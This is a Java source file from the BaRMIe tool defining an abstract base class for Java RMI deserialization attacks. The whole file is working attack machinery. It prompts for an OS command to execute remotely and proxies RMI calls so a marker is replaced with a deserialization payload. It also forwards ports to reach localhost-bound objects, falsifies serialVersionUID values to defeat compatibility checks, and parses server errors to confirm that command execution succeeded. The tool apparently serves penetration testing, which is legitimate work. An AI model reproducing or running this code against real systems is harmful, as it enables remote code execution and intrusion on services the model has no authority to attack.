package nb.barmie.modes.attack;

import java.io.IOException;
import java.io.InvalidClassException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.ServerError;
import java.rmi.ServerException;
import java.rmi.UnmarshalException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.exceptions.BaRMIeGetObjectException;
import nb.barmie.exceptions.BaRMIeUnsupportedException;
import nb.barmie.modes.enumeration.RMIEndpoint;
import nb.barmie.net.proxy.RMIObjectProxy;
import nb.barmie.net.proxy.RMIObjectUIDFixingProxy;

/***********************************************************
 * Abstract base class for RMI deserialization attacks.
 * 
 * Use this as a base class for RMI attacks which target
 * deserialization. For example calling a remote method
 * that accepts an arbitrary Object as a parameter.
 * 
 * The helper methods of this class retrieve RMI objects
 * that are fully proxied so that remote method
 * invocations can be modified as they pass over the
 * network in order to inject deserialization payloads. In
 * addition to this, the helper methods will also set up
 * local port forwarding automatically (in order to access
 * remote objects that are bound to local host), and
 * handle falsifying of remote serialVersionUID values so
 * that they match local values (ensuring compatibility
 * with classes that Java considers to be incompatible).
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public abstract class RMIDeserAttack extends RMIAttack {
	/*******************
	 * Default payload marker - pass this to a remote method to indicate where
	 * to inject the deserialization payload.
	 ******************/
	protected final String DEFAULT_MARKER_OBJECT = "BARMIE_PAYLOAD_MARKER";
	protected final byte[] DEFAULT_MARKER_OBJECT_BYTES = {
		(byte)0x74, (byte)0x00, (byte)0x15, (byte)0x42, (byte)0x41, (byte)0x52, (byte)0x4d, (byte)0x49, (byte)0x45,
		(byte)0x5f, (byte)0x50, (byte)0x41, (byte)0x59, (byte)0x4c, (byte)0x4f, (byte)0x41, (byte)0x44, (byte)0x5f,
		(byte)0x4d, (byte)0x41, (byte)0x52, (byte)0x4b, (byte)0x45, (byte)0x52
	};
	
	/*******************
	 * Default constructor, delegate to super constructor and then mark this
	 * attack as a deserialization attack.
	 ******************/
	public RMIDeserAttack() {
		super();
		this.setIsDeserAttack(true);
	}
	
	/*******************
	 * Deserialization attacks require a deserialization payload so this method
	 * is not supported.
	 * 
	 * @param ep The enumerated RMI endpoint.
	 ******************/
	public void executeAttack(RMIEndpoint ep) throws BaRMIeException {
		throw new BaRMIeUnsupportedException("Cannot execute an RMIDeserAttack without a deserialization payload, call executeAttack(RMIEndpoint, DeserPayload) instead.");
	}
	
	/*******************
	 * Execute the deserialization attack against the given RMI endpoint using
	 * the given payload.
	 * 
	 * This method automatically asks for a payload command to execute.
	 * 
	 * @param ep The enumerated RMI endpoint.
	 * @param payload The DeserPayload to use in the attack.
	 ******************/
	public void executeAttack(RMIEndpoint ep, DeserPayload payload) throws BaRMIeException {
		String payloadCmd;
		
		//Ask the user for a command to execute
		payloadCmd = this.promptUserForInput("Enter an OS command to execute: ", false);
		
		//Pass the payload command on
		this.executeAttack(ep, payload, payloadCmd);
	}
	
	/*******************
	 * Execute the deserialization attack against the given RMI endpoint using
	 * the given payload and command.
	 * 
	 * It is the responsibility of the subclass to prompt the user for any
	 * attack-specific parameters.
	 * 
	 * @param ep The enumerated RMI endpoint.
	 * @param payload The DeserPayload to use in the attack.
	 * @param cmd The command to use for payload generation.
	 ******************/
	public abstract void executeAttack(RMIEndpoint ep, DeserPayload payload, String cmd) throws BaRMIeException;
	
	/*******************
	 * Retrieve a proxied remote object reference.
	 * 
	 * When a remote method call is invoked on the returned object, the call
	 * passes through a proxy which will replace DEFAULT_MARKER_OBJECT_BYTES
	 * with the given payload bytes, in order to trigger object
	 * deserialization.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @param name The name of the remote object to retrieve.
	 * @param payload The raw bytes of the deserialization payload to use.
	 * @return A fully-proxied remote object reference.
	 ******************/
	protected final Object getProxiedObject(RMIEndpoint ep, String name, byte[] payload) throws BaRMIeException {
		return this.getProxiedObject(ep, name, payload, this.DEFAULT_MARKER_OBJECT_BYTES);
	}
	
	/*******************
	 * Retrieve a proxied remote object reference.
	 * 
	 * When a remote method call is invoked on the returned object, the call
	 * passes through a proxy which will replace the given marker bytes with
	 * the given payload bytes, in order to trigger object
	 * deserialization.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @param name The name of the remote object to retrieve.
	 * @param payload The raw bytes of the deserialization payload to use.
	 * @param marker The bytes that the method call proxy should replace with the payload bytes.
	 * @return A fully-proxied remote object reference.
	 ******************/
	protected final Object getProxiedObject(RMIEndpoint ep, String name, byte[] payload, byte[] marker) throws BaRMIeException {
		RMIObjectProxy objProxy;
		Registry reg;
		Object obj;
		
		//Start port forwarding if necessary
		this.startPortForwarding(ep, name);
		
		//Start an RMI object proxy to enable proxying of remote object references
		try {
			objProxy = new RMIObjectProxy(InetAddress.getByName(ep.getEndpoint().getHost()), ep.getEndpoint().getPort(), this._options, payload, marker);
			objProxy.startProxy();
		} catch(UnknownHostException uhe) {
			throw new BaRMIeGetObjectException("Failed to start RMI object proxy, unknown RMI registry host.", uhe);
		}
		this._proxies.add(objProxy);
		
		//Retrieve a proxied RMI registry instance
		try {
			reg = LocateRegistry.getRegistry(objProxy.getServerListenAddress().getHostAddress(), objProxy.getServerListenPort());
		} catch(RemoteException re) {
			throw new BaRMIeGetObjectException("Failed to acquire a proxied RMI registry reference.", re);
		}
		
		//Lookup the target remote object
		try {
			obj = reg.lookup(name);
		} catch(UnmarshalException ue) {
			//An Unmarshal exception might occur if the local class has a different serialVersionUID to the remote one, use a hack to modify the serialVersionUID if this is the case...
			if(ue.getCause() instanceof InvalidClassException && ue.getCause().toString().contains("local class incompatible: stream classdesc serialVersionUID = ")) {
				//Kill the proxy we started, the hack method will create an alternative proxy chain
				objProxy.stopProxy(true);
				
				//Attempt to get the object again, this time using a hack to fix the serialVersionUID field
				obj = this.getProxiedObjectWithUIDHack(ep, name, payload, marker);
			} else {
				//Unknown exception
				throw new BaRMIeGetObjectException("Failed to lookup the object '" + name + "'.", ue);
			}
		} catch(NotBoundException nbe) {
			throw new BaRMIeGetObjectException("The requested remote object was not bound.", nbe);
		} catch(RemoteException re) {
			throw new BaRMIeGetObjectException("Failed to lookup remote object.", re);
		}
		
		//Done, return the proxied object reference
		return obj;
	}
	
	/*******************
	 * Chain a full RMI proxy to a serialVersionUID fixing proxy in order to
	 * retrieve a fully proxied remote object reference even if the
	 * serialVersionUID does not match that of the local class.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @param name The name of the object to look up.
	 * @param payload The raw bytes of the deserialization payload to use.
	 * @param marker The bytes that the method call proxy should replace with the payload bytes.
	 * @return The remote object reference.
	 ******************/
	private final Object getProxiedObjectWithUIDHack(RMIEndpoint ep, String name, byte[] payload, byte[] marker) throws BaRMIeException {
		RMIObjectUIDFixingProxy uidFixer = null;
		RMIObjectProxy objProxy;
		Registry reg;
		Object obj = null;
		
		try {
			//Start a UID fixing proxy
			uidFixer = new RMIObjectUIDFixingProxy(InetAddress.getByName(ep.getEndpoint().getHost()), ep.getEndpoint().getPort(), this._options);
			uidFixer.startProxy();
			this._proxies.add(uidFixer);
			
			//Start an RMI object proxy and chain it to the UID fixing proxy
			objProxy = new RMIObjectProxy(uidFixer.getServerListenAddress(), uidFixer.getServerListenPort(), this._options, payload, marker);
			objProxy.startProxy();
			this._proxies.add(objProxy);
			
			//Retrieve a proxied RMI registry instance
			reg = LocateRegistry.getRegistry(objProxy.getServerListenAddress().getHostAddress(), objProxy.getServerListenPort());
			
			//Lookup the target remote object
			obj = reg.lookup(name);
		} catch(Exception ex) {
			throw new BaRMIeGetObjectException("Failed to retrieve proxied object using serialVersionUID hack.", ex);
		}
		
		//Return the remote object
		return obj;
	}
	
	/*******************
	 * Helper method which checks exceptions triggered by a deserialization
	 * attacks and attempts to provide additional output to guide the user.
	 * 
	 * If a ServerException was caused by a ClassNotFoundException then we can
	 * safely assume that the chosen gadget chain is not available on the
	 * server.
	 * 
	 * If a ServerError was caused by an IOException which has "Cannot run
	 * program" in the message then we can safely assume that the chosen gadget
	 * chain is present, but the command wasn't available.
	 * 
	 * @param ex 
	 ******************/
	protected final void checkDeserException(Throwable t) {
		boolean responded = false;
		
		//Check for server-side ClassNotFoundException, indicating that the payload is no use
		if(t instanceof ServerException) {
			while(t.getCause() != null) {
				t = t.getCause();
				if(t instanceof ClassNotFoundException) {
					System.out.println("\n[-] The chosen deserialization payload is not available at the server side.");
					responded = true;
					break;
				}
			}
		}
		
		//Check for server-side IOException saying that the program could not be run, indicating a successful attack but unavailable target program
		if(t instanceof ServerError) {
			while(t.getCause() != null) {
				t = t.getCause();
				if(t instanceof IOException && t.getMessage().contains("Cannot run program")) {
					System.out.println("\n[+] The attack was successful, however the chosen command was not available.");
					responded = true;
					break;
				}
			}
		}
		
		//Print generic response if we can't work anything out from the exception
		if(responded == false) {
			System.out.println("\n[~] Attack completed but success could not be verified.");
		}
	}
}
